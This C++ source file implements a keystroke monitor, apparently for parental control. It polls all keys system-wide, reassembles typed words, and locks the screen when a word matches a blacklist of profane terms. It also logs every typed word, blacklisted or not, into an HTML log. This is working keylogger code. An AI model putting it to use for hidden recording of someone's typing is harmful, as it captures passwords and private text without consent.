#include "KeyspaceMonitor.h"
#include <Windows.h>
#include <thread>
#include <algorithm>
#include <unordered_map>

KeyspaceMonitor::KeyspaceMonitor(ScreenLocker* screenLocker)
    : screenLocker(screenLocker), running(false) {
    typeLog = new std::vector<u_char>{};

    // Add words to the blacklist
    blacklist.push_back("PORN");
    blacklist.push_back("FUCK");
    blacklist.push_back("SEX");
    blacklist.push_back("XXX");
    blacklist.push_back("HENTAI");
    blacklist.push_back("BOOBS");
    blacklist.push_back("ASS");
    blacklist.push_back("TITS");
    blacklist.push_back("PENIS");
    blacklist.push_back("VAGINA");
    blacklist.push_back("SLUT");
    blacklist.push_back("WHORE");
    blacklist.push_back("BITCH");
    blacklist.push_back("BASTARD");
    blacklist.push_back("WANKER");

    startMonitoring();
}

KeyspaceMonitor::~KeyspaceMonitor() {
    stopMonitoring();
}

void KeyspaceMonitor::startMonitoring() {
    running = true;
    std::thread monitorThread(&KeyspaceMonitor::monitorKeyPresses, this);
    monitorThread.detach();
}

void KeyspaceMonitor::stopMonitoring() {
    running = false;
}

void KeyspaceMonitor::getLog(std::vector<u_char>& outLog) {
    outLog = *typeLog;
    typeLog->clear();
}

void KeyspaceMonitor::monitorKeyPresses() {
    std::string currentWord;
    std::unordered_map<int, bool> keyStates;

    while (running) {
        for (int i = 0x01; i <= 0xFE; ++i) {
            if (GetAsyncKeyState(i) & 0x8000) {
                if (!keyStates[i]) { // Check if the key was previously not pressed
                    if (i >= 0x30 && i <= 0x5A) { // alphanumeric keys
                        currentWord += static_cast<char>(i);
                    }
                    else if (i == VK_SPACE || i == VK_RETURN) {
                        // Check if the current word contains any blacklisted word
                        bool blacklisted = false;
                        for (const auto& word : blacklist) {
                            if (currentWord.find(word) != std::string::npos) {
                                blacklisted = true;
                                break;
                            }
                        }

                        if (blacklisted) {
                            screenLocker->runInThread();
                            appendToLog(currentWord, true);
                            // Lock the screen and log
                        }
                        else {
                            appendToLog(currentWord, false);
                            // just log
                        }
                        
                        currentWord.clear();
                    }
                    else if (i == VK_BACK) {
                        if (!currentWord.empty()) {
                            currentWord.pop_back();
                        }
                    }
                    keyStates[i] = true; // Mark the key as pressed
                }
            }
            else {
                keyStates[i] = false; // Mark the key as not pressed
            }
        }
        Sleep(10); // Add a delay to prevent high CPU usage
    }
}

void KeyspaceMonitor::appendToLog(std::string word, bool blacklisted)
{
    if (blacklisted) {
        word = "<h3 style=\"color: red\">" + word + " </h3>";
        for (auto& ch : word) {
            typeLog->emplace_back(ch);
        }
        typeLog->emplace_back(' '); 
    }
    else {
        for (auto& ch : word) {
            typeLog->emplace_back(ch);
        }
        typeLog->emplace_back(' ');
    }
}



